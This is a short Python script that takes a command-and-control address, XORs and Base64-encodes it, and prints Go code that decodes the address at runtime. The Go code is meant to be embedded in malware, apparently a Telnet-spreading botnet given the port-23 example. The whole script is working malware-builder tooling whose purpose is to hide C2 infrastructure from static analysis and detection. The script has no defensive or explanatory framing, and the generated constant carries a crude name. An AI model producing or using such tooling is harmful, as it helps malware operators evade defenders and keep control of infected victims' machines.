#!/usr/bin/env python3
import base64
import sys

def obfuscate_c2(c2_address, xor_key=0x55):
    """Generate XOR+Base64 obfuscated C2 address"""
    
    print(f"Original C2: {c2_address}")
    print(f"XOR Key: 0x{xor_key:02x} ({xor_key})")
    print()
    
    # XOR encrypt
    xor_bytes = bytes([ord(c) ^ xor_key for c in c2_address])
    print(f"XOR encrypted (hex): {xor_bytes.hex()}")
    
    # Base64 encode
    base64_encoded = base64.b64encode(xor_bytes).decode()
    print(f"Base64 encoded: {base64_encoded}")
    print()
    
    # Generate Go code
    go_code = f'''const gothTits = "{base64_encoded}"

func requestMore() string {{
    // Step 1: Base64 decode
    decoded, err := base64.StdEncoding.DecodeString(gothTits)
    if err != nil {{
        os.Exit(0)
    }}
    
    // Step 2: XOR decrypt with key 0x{xor_key:02x}
    for i := range decoded {{
        decoded[i] ^= 0x{xor_key:02x}
    }}
    
    return string(decoded)
}}'''
    
    print("Go Code:")
    print("=" * 40)
    print(go_code)
    print()
    
    # Verify
    decoded = base64.b64decode(base64_encoded)
    decrypted = bytes([b ^ xor_key for b in decoded])
    print(f"Verification: {decrypted.decode()}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <c2_address>")
        print(f'Example: {sys.argv[0]} "1.1.1.1:23"')
        sys.exit(1)
    
    obfuscate_c2(sys.argv[1])